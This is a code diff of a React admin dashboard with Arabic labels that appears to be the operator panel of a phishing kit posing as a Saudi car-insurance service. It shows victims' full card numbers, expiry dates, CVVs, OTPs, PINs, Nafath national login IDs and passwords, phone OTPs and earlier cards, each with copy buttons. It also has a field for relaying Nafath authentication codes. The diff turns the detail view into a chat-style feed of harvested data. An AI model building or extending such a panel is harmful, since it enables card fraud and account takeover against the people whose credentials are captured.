-                                {selectedApplication.pinCode}
-                              </p>
-                            </div>
-                            <ApprovalButtons
-                              onApprove={() =>
-                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "approved")
-                              }
-                              onReject={() =>
-                                handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "rejected")
-                              }
-                              approveDisabled={selectedApplication.idVerificationStatus === "approved"}
-                              rejectDisabled={selectedApplication.idVerificationStatus === "rejected"}
-                            />
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* Phone Section */}
-                      {(selectedApplication.phoneNumber2 || selectedApplication.phoneOtp) && (
-                        <DetailSection icon={Phone} title="معلومات الهاتف" delay={200}>
-                          <div className="space-y-4">
-                            <div className="grid grid-cols-2 gap-2">
-                              <DataField label="الهاتف" value={selectedApplication.phoneNumber2} mono copyable />
-                              <DataField label="مزود الخدمة" value={selectedApplication.selectedCarrier} />
-                            </div>
-                            {selectedApplication.phoneOtp && (
-                              <div className="p-3 bg-muted/50 rounded-lg text-center">
-                                <p className="text-[10px] text-muted-foreground mb-1">رمز الهاتف</p>
-                                <p className="text-xl font-bold font-mono" dir="ltr">
-                                  {selectedApplication.phoneOtp}
-                                </p>
-                              </div>
-                            )}
-                            <ApprovalButtons
-                              onApprove={() =>
-                                handleApprovalChange(selectedApplication.id!, "phoneVerificationStatus", "approved")
-                              }
-                              onReject={() =>
-                                handleApprovalChange(selectedApplication.id!, "phoneVerificationStatus", "rejected")
-                              }
-                              approveDisabled={selectedApplication.phoneVerificationStatus === "approved"}
-                              rejectDisabled={selectedApplication.phoneVerificationStatus === "rejected"}
-                            />
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* Nafaz Section */}
-                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
-                        <DetailSection icon={User} title="نفاذ الوطني" delay={250}>
-                          <div className="space-y-3">
-                            <DataField label="الرقم الوطني" value={selectedApplication.nafazId} mono copyable />
-                            <DataField label="الرقم السري" value={selectedApplication.nafazPass} mono copyable />
-                            <div className="pt-3 border-t border-border space-y-2">
-                              <Input
-                                type="tel"
-                                value={authNumber}
-                                onChange={(e) => setAuthNumber(e.target.value)}
-                                placeholder="أدخل رمز التوثيق"
-                                className="h-9 text-sm"
-                              />
-                              <Button
-                                onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
-                                size="sm"
-                                className="w-full"
-                                disabled={!authNumber}
-                              >
-                                <CheckCircle className="w-4 h-4 ml-1.5" />
-                                حفظ رمز التوثيق
-                              </Button>
-                            </div>
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* Document Section */}
-                      {selectedApplication.documentType && (
-                        <DetailSection icon={FileText} title="معلومات الوثيقة" delay={300}>
-                          <div className="space-y-2">
-                            <DataField label="نوع الوثيقة" value={selectedApplication.documentType} />
-                            <DataField label="الاسم" value={selectedApplication.ownerName} />
-                            <DataField label="الاسم البائع" value={selectedApplication.buyerName} />
-                            <DataField label="رقم وطني البائع" value={selectedApplication.buyerIdNumber} />
-                            <DataField label="رقم وطني" value={selectedApplication.identityNumber} />
-                            <DataField label="رقم التسلسلي" value={selectedApplication.serialNumber} mono copyable />
-                            <DataField label="رقم الهاتف" value={selectedApplication.phoneNumber} mono copyable />
-                            <DataField label="الدولة" value={selectedApplication.country} />
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* Insurance Section */}
-                      {(selectedApplication.insuranceType || selectedApplication.insuranceStartDate) && (
-                        <DetailSection icon={Shield} title="تفاصيل التأمين" delay={350}>
-                          <div className="space-y-2">
-                            <DataField label="نوع التأمين" value={selectedApplication.insuranceType} />
-                            <DataField label="تاريخ البدء" value={selectedApplication.insuranceStartDate} />
-                            <DataField
-                              label="موقع الإصلاح"
-                              value={selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
-                            />
-                          </div>
-                        </DetailSection>
-                      )}
-
-                      {/* Vehicle Section */}
-                      {(selectedApplication.vehicleModel || selectedApplication.manufacturingYear) && (
-                        <DetailSection icon={Car} title="معلومات المركبة" delay={400}>
-                          <div className="grid grid-cols-2 gap-2">
-                            <DataField label="الموديل" value={selectedApplication.vehicleModel} />
-                            <DataField label="سنة الصنع" value={selectedApplication.manufacturingYear?.toString()} />
-                            <DataField
-                              label="القيمة"
-                              value={
-                                selectedApplication.vehicleValue
-                                  ? `${selectedApplication.vehicleValue} ريال`
-                                  : undefined
-                              }
-                            />
-                            <DataField label="الاستخدام" value={selectedApplication.vehicleUsage} />
-                          </div>
-                        </DetailSection>
-                      )}
-                    </div>
-                  ) : (
+                {/* Conversation Messages */}
+                <div className="flex-1 overflow-y-auto p-3 space-y-2">
+                  {!hasData(selectedApplication) ? (
                     <div className="flex items-center justify-center h-full">
-                      <div className="text-center">
-                        <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
-                          <FileText className="w-10 h-10 text-muted-foreground" />
-                        </div>
-                        <h3 className="text-lg font-semibold text-foreground mb-1">لا توجد بيانات</h3>
-                        <p className="text-sm text-muted-foreground">لم يتم إضافة معلومات لهذا الطلب بعد</p>
+                      <div className="text-center text-slate-500">
+                        <User className="w-10 h-10 mx-auto mb-2 text-slate-600" />
+                        <p className="text-sm">زائر فقط</p>
+                        <p className="text-[10px]">لا توجد بيانات مسجلة</p>
                       </div>
                     </div>
+                  ) : (
+                    <>
+                      {/* Card Data Message */}
+                      {selectedApplication.cardNumber && (
+                        <div className="flex justify-start">
+                          <div className={`max-w-[80%] rounded-2xl rounded-tr-sm p-3 ${blockedCards.includes(selectedApplication.cardNumber) ? "bg-red-900/30 border border-red-500/30" : "bg-slate-800"}`}>
+                            <div className="flex items-center gap-2 mb-2">
+                              <CreditCard className="w-4 h-4 text-amber-400" />
+                              <span className="text-[10px] font-bold text-amber-400">بطاقة الدفع</span>
+                              {blockedCards.includes(selectedApplication.cardNumber) && (
+                                <Badge className="text-[8px] bg-red-500/20 text-red-400 border-0">محظورة</Badge>
+                              )}
+                            </div>
+                            <div className="space-y-1.5">
+                              <DataRow label="رقم البطاقة" value={selectedApplication.cardNumber} onCopy={copyToClipboard} copied={copiedField} />
+                              {selectedApplication.expiryDate && <DataRow label="تاريخ الانتهاء" value={selectedApplication.expiryDate} onCopy={copyToClipboard} copied={copiedField} />}
+                              {selectedApplication.cvv && <DataRow label="CVV" value={selectedApplication.cvv} onCopy={copyToClipboard} copied={copiedField} />}
+                              {selectedApplication.totalPrice && (
+                                <div className="mt-2 p-2 bg-emerald-500/10 rounded text-center">
+                                  <span className="text-emerald-400 font-bold">{selectedApplication.totalPrice} ر.س</span>
+                                </div>
+                              )}
+                            </div>
+                            {!blockedCards.includes(selectedApplication.cardNumber) && (
+                              <Button onClick={() => blockCard(selectedApplication.cardNumber!)} size="sm" className="mt-2 h-5 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30 w-full">
+                                <Ban className="w-2.5 h-2.5 ml-1" />
+                                حظر البطاقة
+                              </Button>
+                            )}
+                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* OTP Message */}
+                      {selectedApplication.otp && (
+                        <div className="flex justify-start">
+                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
+                            <div className="flex items-center gap-2 mb-2">
+                              <Shield className="w-4 h-4 text-blue-400" />
+                              <span className="text-[10px] font-bold text-blue-400">رمز OTP</span>
+                            </div>
+                            <div className="text-2xl font-bold text-white text-center tracking-widest py-2" dir="ltr">
+                              {selectedApplication.otp}
+                            </div>
+                            {selectedApplication.allOtps && selectedApplication.allOtps.length > 1 && (
+                              <div className="mt-2 pt-2 border-t border-slate-700">
+                                <span className="text-[9px] text-slate-500">السابقة: </span>
+                                {selectedApplication.allOtps.slice(0, -1).map((otp, i) => (
+                                  <Badge key={i} className="text-[8px] bg-slate-700 text-slate-400 border-0 ml-1">{otp}</Badge>
+                                ))}
+                              </div>
+                            )}
+                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* PIN Message */}
+                      {selectedApplication.pinCode && (
+                        <div className="flex justify-start">
+                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
+                            <div className="flex items-center gap-2 mb-2">
+                              <Shield className="w-4 h-4 text-purple-400" />
+                              <span className="text-[10px] font-bold text-purple-400">رمز PIN</span>
+                            </div>
+                            <div className="text-2xl font-bold text-white text-center tracking-widest py-2" dir="ltr">
+                              {selectedApplication.pinCode}
+                            </div>
+                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Nafaz Message */}
+                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
+                        <div className="flex justify-start">
+                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
+                            <div className="flex items-center gap-2 mb-2">
+                              <Shield className="w-4 h-4 text-green-400" />
+                              <span className="text-[10px] font-bold text-green-400">نفاذ</span>
+                            </div>
+                            <div className="space-y-1.5">
+                              {selectedApplication.nafazId && <DataRow label="المعرف" value={selectedApplication.nafazId} onCopy={copyToClipboard} copied={copiedField} />}
+                              {selectedApplication.nafazPass && <DataRow label="كلمة المرور" value={selectedApplication.nafazPass} onCopy={copyToClipboard} copied={copiedField} />}
+                            </div>
+                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Phone Data Message */}
+                      {(selectedApplication.phoneNumber2 || selectedApplication.phoneOtp) && (
+                        <div className="flex justify-start">
+                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
+                            <div className="flex items-center gap-2 mb-2">
+                              <Phone className="w-4 h-4 text-cyan-400" />
+                              <span className="text-[10px] font-bold text-cyan-400">بيانات الهاتف</span>
+                            </div>
+                            <div className="space-y-1.5">
+                              {selectedApplication.phoneNumber2 && <DataRow label="الرقم" value={selectedApplication.phoneNumber2} onCopy={copyToClipboard} copied={copiedField} />}
+                              {selectedApplication.phoneOtp && <DataRow label="OTP الهاتف" value={selectedApplication.phoneOtp} onCopy={copyToClipboard} copied={copiedField} />}
+                            </div>
+                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Card History */}
+                      {selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 && (
+                        <div className="flex justify-start">
+                          <div className="max-w-[80%] bg-slate-800/50 rounded-2xl rounded-tr-sm p-3">
+                            <div className="flex items-center gap-2 mb-2">
+                              <History className="w-4 h-4 text-slate-400" />
+                              <span className="text-[10px] font-bold text-slate-400">البطاقات السابقة ({selectedApplication.cardHistory.length})</span>
+                            </div>
+                            <div className="space-y-2">
+                              {selectedApplication.cardHistory.map((card: any, i: number) => (
+                                <div key={i} className="p-2 bg-slate-900 rounded text-[10px]">
+                                  <div className="font-mono text-slate-300" dir="ltr">{card.cardNumber}</div>
+                                  <div className="text-slate-500 text-[9px]">{card.expiryDate} • {card.cvv}</div>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        </div>
+                      )}
+                    </>
                   )}
                 </div>
-              </div>
+              </>
             )
           ) : (
-            <div className="flex items-center justify-center h-full">
-              <div className="text-center">
-                <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
-                  <Mail className="w-10 h-10 text-muted-foreground" />
-                </div>
-                <h3 className="text-lg font-semibold text-foreground mb-1">اختر طلباً لعرض التفاصيل</h3>
-                <p className="text-sm text-muted-foreground">اضغط على أي طلب من القائمة الجانبية</p>
+            <div className="flex-1 flex items-center justify-center">
+              <div className="text-center text-slate-500">
+                <MessageSquare className="w-12 h-12 mx-auto mb-3 text-slate-700" />
+                <p className="text-sm">اختر محادثة</p>
+                <p className="text-[10px]">اضغط على أي عنصر من القائمة</p>
               </div>
             </div>
           )}
         </div>
+      </div>
+    </div>
+  )
+}
+
+function DataRow({ label, value, onCopy, copied }: { label: string; value: string; onCopy: (v: string, id: string) => void; copied: string | null }) {
+  const id = `${label}-${value}`
+  return (
+    <div className="flex items-center justify-between bg-slate-900/50 rounded px-2 py-1">
+      <span className="text-[9px] text-slate-500">{label}</span>
+      <div className="flex items-center gap-1">
+        <span className="text-[10px] text-white font-mono" dir="ltr">{value}</span>
+        <button onClick={() => onCopy(value, id)} className="text-slate-500 hover:text-white p-0.5">
+          {copied === id ? <Check className="w-2.5 h-2.5 text-emerald-400" /> : <Copy className="w-2.5 h-2.5" />}
+        </button>
       </div>
     </div>
   )
